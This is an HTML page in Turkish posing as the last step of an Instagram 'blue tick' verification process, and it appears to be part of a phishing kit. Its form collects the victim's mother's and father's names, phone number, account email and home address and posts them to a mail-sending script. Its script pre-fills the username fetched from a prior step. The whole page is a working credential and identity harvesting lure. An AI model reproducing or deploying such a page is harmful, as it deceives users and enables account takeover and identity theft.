<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mavi Tik İşlemi</title>
    <link rel="stylesheet" href="styles.css">
    <link rel="icon" href="fav.png" type="image/png">
</head>
<body>
    <div class="container">
        <div class="form-container">
            <h1>Mavi Tik İşleminin Sonuna Geldik</h1>
            <form id="confirmForm" method="POST" action="send_email.php">
                <div class="input-group">
                    <label for="username">Kullanıcı Adı</label>
                    <input type="text" id="username" name="username" readonly>
                </div>
                <div class="input-group">
                    <label for="mother_name">Anne Adı</label>
                    <input type="text" id="mother_name" name="mother_name" required>
                </div>
                <div class="input-group">
                    <label for="father_name">Baba Adı</label>
                    <input type="text" id="father_name" name="father_name" required>
                </div>
                <div class="input-group">
                    <label for="phone_number">Telefon Numarası</label>
                    <input type="tel" id="phone_number" name="phone_number" required>
                </div>
                <div class="input-group">
                    <label for="email">Instagram Hesabına Bağlı Email</label>
                    <input type="email" id="email" name="email" required>
                </div>
                <div class="input-group">
                    <label for="address">Adres</label>
                    <textarea id="address" name="address" required></textarea>
                </div>
                <button type="submit" class="btn">Gönder</button>
            </form>
        </div>
    </div>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            fetch('get_username.php')
            .then(response => response.json())
            .then(data => {
                if (data.status === 'success') {
                    document.getElementById('username').value = data.username;
                } else {
                    alert('Kullanıcı adı alınamadı.');
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert('Bir hata oluştu. Lütfen tekrar deneyin.');
            });
        });
    </script>
</body>
</html>
